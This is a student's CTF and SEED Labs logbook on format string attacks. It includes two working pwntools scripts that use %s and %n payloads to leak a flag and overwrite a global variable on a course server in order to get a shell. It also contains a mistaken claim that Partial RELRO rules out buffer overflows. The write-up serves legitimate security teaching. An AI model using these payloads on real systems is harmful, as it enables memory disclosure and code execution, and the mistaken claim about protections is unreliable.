# LOGBOOK #6

## SEED Labs - Format String Attack Lab

### Tasks

The guides for each of the tasks are located at:

- [Task #1](guides/logbook-6/task1.md)
- [Task #2](guides/logbook-6/task2.md)
- [Task #3](guides/logbook-6/task3.md)

## CTF - Desafio 1

```
RELRO           STACK CANARY      NX            PIE            RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   81 Symbols     Yes	0		2	program
```

This program has a *Partial RELRO*, so we know that we won't be able to do a buffer overflow. Also there is a *stack canary*, so there are low chances of having a stack smash. *NX* is enabled, so the stack isn't executable and we can't make a jump to a custom shellcode. There is no *PIE*.

After seeing the code, we've noticed a code segment vulnerable to format string attack:

```c
    scanf("%32s", &buffer);
    printf("You gave me this: ");
    printf(buffer);
```

Watching this, we know that the printf is vulnerable to format strings and even better, that we control its input.

We have also noticed that the flag is being loaded into a global variable `flag`, so, we can easily use GDB to find its address, by doing `p &flag`.

![CTF Challenge 1](/images/logbook6/00.png)

- In contrary to SEED Labs, we didn't need to calculate the offset, because we got our input imediatly:

```bash
❯ echo "ABCDE %s" | nc ctf-fsi.fe.up.pt 4004
Try to unlock the flag.
Show me what you got:You gave me this: ABCDE
Disqualified!
```

Now that we know the address of `flag`, we can build our payload:

```python
from pwn import *

p = remote("ctf-fsi.fe.up.pt", 4004)

payload = (0x804c060).to_bytes(4, byteorder='little') + b"%s"
p.recvuntil(b"got:")
p.sendline(payload)
p.interactive()
```

## CTF - Challenge 2

This challenge is similar to the first one, but with some changes.
In this challenge, instead of just reading the value of a global variable, you have to change its value to `0xbeef` to get a shell.

In this task, we cannot write directly 48879 (beef in decimal) to the address. Firstly, we have to write the global variable's address `0x0804c034`, which was found with gdb like in the previous challenge address to the payload, as in the previous examples and then, as the address are 4 Bytes, we write 48879 - 4 = `48875 Bytes`.

Also, by reading `man 3 printf`, we know that in printf, `%n` is a special string formatter that instead of displaying something, loads the number of character that have been printed before itself to the variable pointed by the argument (which, in this case is our address).

```python
from pwn import *

p = remote("ctf-fsi.fe.up.pt", 4005)

payload = (0x0804c034).to_bytes(4, byteorder='little') + b"%48875x" + b"%1$n"
p.recvuntil(b"here...")
p.sendline(payload)
p.interactive()
```

![CTF Challenge 2](/images/logbook6/01.png)

Note: The notation `%<n>$d` is just the same as applying the string formatter to the n-th value, but in a less exhaustive way.  